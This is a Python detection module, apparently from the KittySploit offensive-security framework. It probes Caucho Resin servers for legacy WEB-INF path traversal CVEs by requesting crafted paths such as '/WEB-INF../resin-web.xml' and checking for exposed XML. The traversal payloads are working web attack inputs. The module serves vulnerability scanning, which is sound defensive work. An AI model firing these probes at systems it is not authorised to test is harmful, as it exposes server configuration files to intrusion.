#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Caucho Resin legacy WEB-INF path traversal (CVE-2001-0399 / 2004-0281 / 2007-2440)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Caucho Resin - Legacy WEB-INF Path Traversal Detection',
        'description': (
            'Detects classic Caucho Resin path-traversal tricks that expose '
            'WEB-INF/resin-web.xml: /.jsp/WEB-INF/ (CVE-2001-0399), /WEB-INF../ '
            '(CVE-2004-0281), and /%20../WEB-INF/ (CVE-2007-2440).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2001', 'cve2004', 'cve2007', 'resin',
            'caucho', 'lfi', 'path-traversal', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2021_44138_detect'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2001-0399',
            'https://nvd.nist.gov/vuln/detail/CVE-2004-0281',
            'https://nvd.nist.gov/vuln/detail/CVE-2007-2440',
            'https://web.archive.org/web/20080618193818/http://www.rapid7.com/advisories/R7-0029.jsp',
        ],
        'cve': 'CVE-2007-2440',
    }

    def run(self):
        xml_re = re.compile(
            r'^\s*<(web-app(\s|>)|servlet(-mapping)?>)',
            re.M | re.I,
        )
        close_re = re.compile(r'^\s*</(web-app|servlet(-mapping)?)>', re.M | re.I)
        paths = (
            '/.jsp/WEB-INF/resin-web.xml',
            '/resin-doc/.jsp/WEB-INF/resin-web.xml',
            '/WEB-INF../resin-web.xml',
            '/resin-doc/WEB-INF../resin-web.xml',
            '/%20../WEB-INF/resin-web.xml',
            '/resin-doc/%20../WEB-INF/resin-web.xml',
        )
        for path in paths:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if xml_re.search(body) and close_re.search(body):
                self.set_info(
                    severity='high',
                    reason='Caucho Resin WEB-INF path traversal (legacy CVE family)',
                    path=path,
                )
                return True
        return False
